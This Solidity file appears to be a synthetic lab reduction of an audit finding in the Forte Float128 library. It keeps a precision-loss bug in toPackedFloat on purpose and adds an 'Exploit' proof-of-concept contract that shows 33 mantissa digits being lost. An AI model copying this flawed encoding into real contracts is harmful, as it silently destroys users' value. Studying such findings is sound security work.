// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Forte Float128 — [H-05] Precision loss in toPackedFloat when mantissa is
    in range (MAX_M_DIGIT_NUMBER, MIN_L_DIGIT_NUMBER)
    (Code4rena 2025-04-forte-float128-solidity-library, finding #55707)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: toPackedFloat chooses M vs L size from the exponent alone.
    When the mantissa has 39–71 digits (between M-max and L-min) and the
    exponent is low enough that isResultL stays false, the mantissa is
    downcast to 38 digits by dividing out (digitsMantissa - 38) bases —
    permanently destroying up to 33 significant digits.

    `toPackedFloat` / `findNumberOfDigits` / `decode` reduced from
    src/Float128.sol (commit f0d79045a34291cc2cfe7516aeb1e64386d77cd6).
//////////////////////////////////////////////////////////////////////////*/

type packedFloat is uint256;

contract VulnerableFloat128 {
    uint256 constant MANTISSA_MASK =
        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    uint256 constant MANTISSA_SIGN_MASK =
        0x1000000000000000000000000000000000000000000000000000000000000;
    uint256 constant MANTISSA_L_FLAG_MASK =
        0x2000000000000000000000000000000000000000000000000000000000000;
    uint256 constant TWO_COMPLEMENT_SIGN_MASK =
        0x8000000000000000000000000000000000000000000000000000000000000000;
    uint256 constant BASE = 10;
    uint256 constant ZERO_OFFSET = 8192;
    uint256 constant ZERO_OFFSET_MINUS_1 = 8191;
    uint256 constant EXPONENT_BIT = 242;
    uint256 constant MAX_DIGITS_M = 38;
    uint256 constant DIGIT_DIFF_L_M = 34;
    uint256 constant MAX_M_DIGIT_NUMBER = 99999999999999999999999999999999999999;
    uint256 constant MIN_M_DIGIT_NUMBER = 10000000000000000000000000000000000000;
    uint256 constant MAX_L_DIGIT_NUMBER =
        999999999999999999999999999999999999999999999999999999999999999999999999;
    uint256 constant MIN_L_DIGIT_NUMBER =
        100000000000000000000000000000000000000000000000000000000000000000000000;
    uint256 constant BASE_TO_THE_DIGIT_DIFF = 10000000000000000000000000000000000;
    int256 constant MAXIMUM_EXPONENT = -18;

    /// @dev Verbatim Float128.toPackedFloat (L1083–L1135).
    function toPackedFloat(int256 mantissa, int256 exponent) public pure returns (packedFloat float) {
        uint256 digitsMantissa;
        uint256 mantissaMultiplier;
        // we start by extracting the sign of the mantissa
        if (mantissa != 0) {
            assembly {
                if and(mantissa, TWO_COMPLEMENT_SIGN_MASK) {
                    float := MANTISSA_SIGN_MASK
                    mantissa := sub(0, mantissa)
                }
            }
            // we normalize only if necessary
            if (
                !((mantissa <= int256(MAX_M_DIGIT_NUMBER) && mantissa >= int256(MIN_M_DIGIT_NUMBER)) ||
                    (mantissa <= int256(MAX_L_DIGIT_NUMBER) && mantissa >= int256(MIN_L_DIGIT_NUMBER)))
            ) {
                digitsMantissa = findNumberOfDigits(uint256(mantissa));
                assembly {
                    mantissaMultiplier := sub(digitsMantissa, MAX_DIGITS_M)
                    // size chosen from exponent alone — digitsMantissa > MAX_DIGITS_M is ignored
                    let isResultL := slt(MAXIMUM_EXPONENT, add(exponent, mantissaMultiplier)) // @> VULN: isResultL ignores digitsMantissa; mid-range (39-71 digit) mantissas force-downcast to M
                    // FIX: isResultL := or(isResultL, gt(digitsMantissa, MAX_DIGITS_M))
                    if isResultL {
                        mantissaMultiplier := sub(mantissaMultiplier, DIGIT_DIFF_L_M)
                        float := or(float, MANTISSA_L_FLAG_MASK)
                    }
                    exponent := add(exponent, mantissaMultiplier)
                    let negativeMultiplier := and(TWO_COMPLEMENT_SIGN_MASK, mantissaMultiplier)
                    if negativeMultiplier {
                        mantissa := mul(mantissa, exp(BASE, sub(0, mantissaMultiplier)))
                    }
                    if iszero(negativeMultiplier) {
                        mantissa := div(mantissa, exp(BASE, mantissaMultiplier))
                    }
                }
            } else if (
                (mantissa <= int256(MAX_M_DIGIT_NUMBER) && mantissa >= int256(MIN_M_DIGIT_NUMBER)) &&
                exponent > MAXIMUM_EXPONENT
            ) {
                assembly {
                    mantissa := mul(mantissa, BASE_TO_THE_DIGIT_DIFF)
                    exponent := sub(exponent, DIGIT_DIFF_L_M)
                    float := add(float, MANTISSA_L_FLAG_MASK)
                }
            } else if ((mantissa <= int256(MAX_L_DIGIT_NUMBER) && mantissa >= int256(MIN_L_DIGIT_NUMBER))) {
                assembly {
                    float := add(float, MANTISSA_L_FLAG_MASK)
                }
            }
            // final encoding
            assembly {
                float := or(float, or(mantissa, shl(EXPONENT_BIT, add(exponent, ZERO_OFFSET))))
            }
        }
    }

    function decode(packedFloat float) public pure returns (int256 mantissa, int256 exponent) {
        assembly {
            let _exp := shr(EXPONENT_BIT, float)
            if gt(ZERO_OFFSET, _exp) {
                exponent := sub(0, sub(ZERO_OFFSET, _exp))
            }
            if gt(_exp, ZERO_OFFSET_MINUS_1) {
                exponent := sub(_exp, ZERO_OFFSET)
            }
            mantissa := and(float, MANTISSA_MASK)
            if and(float, MANTISSA_SIGN_MASK) {
                mantissa := sub(0, mantissa)
            }
        }
    }

    function findNumberOfDigits(uint256 x) public pure returns (uint256 log) {
        assembly {
            if gt(x, 0) {
                if gt(x, 9999999999999999999999999999999999999999999999999999999999999999) {
                    log := 64
                    x := div(x, 10000000000000000000000000000000000000000000000000000000000000000)
                }
                if gt(x, 99999999999999999999999999999999) {
                    log := add(log, 32)
                    x := div(x, 100000000000000000000000000000000)
                }
                if gt(x, 9999999999999999) {
                    log := add(log, 16)
                    x := div(x, 10000000000000000)
                }
                if gt(x, 99999999) {
                    log := add(log, 8)
                    x := div(x, 100000000)
                }
                if gt(x, 9999) {
                    log := add(log, 4)
                    x := div(x, 10000)
                }
                if gt(x, 99) {
                    log := add(log, 2)
                    x := div(x, 100)
                }
                if gt(x, 9) {
                    log := add(log, 1)
                }
                log := add(log, 1)
            }
        }
    }
}

contract Exploit {
    VulnerableFloat128 public lib; // CREATE nonce 1

    constructor() {
        lib = new VulnerableFloat128();
    }

    function run() external {
        // Finding PoC: man = 2^235 (71 digits), expo = -51.
        // 2^235 sits between MAX_M (38 digits) and MIN_L (72 digits).
        int256 man = int256(uint256(1) << 235);
        int256 expo = -51;

        packedFloat float = lib.toPackedFloat(man, expo);
        (int256 manDecode, int256 expDecode) = lib.decode(float);

        // Buggy path downcasts to 38-digit M mantissa.
        uint256 digitsOut = lib.findNumberOfDigits(uint256(manDecode));
        require(digitsOut == 38, "buggy encode must force M-size (38 digits)");
        require(expDecode == -18, "buggy exponent lands at MAXIMUM_EXPONENT path");

        // Reverse-normalize: recovered = manDecode * 10^(expDecode - expo)
        // expDiff = -18 - (-51) = 33 → recovered has 38+33 = 71 digits but trailing zeros
        // where the original had significant digits → permanent precision loss.
        int256 expDiff = expDecode - expo;
        require(expDiff == 33, "expected 33-digit downcast");
        int256 recovered = manDecode;
        for (int256 i = 0; i < expDiff; i++) {
            recovered *= 10;
        }
        require(recovered < man, "harm: recovered value strictly less than input mantissa");
        require(man - recovered == 608871777363092441300193790394368, "concrete digit loss");
    }
}
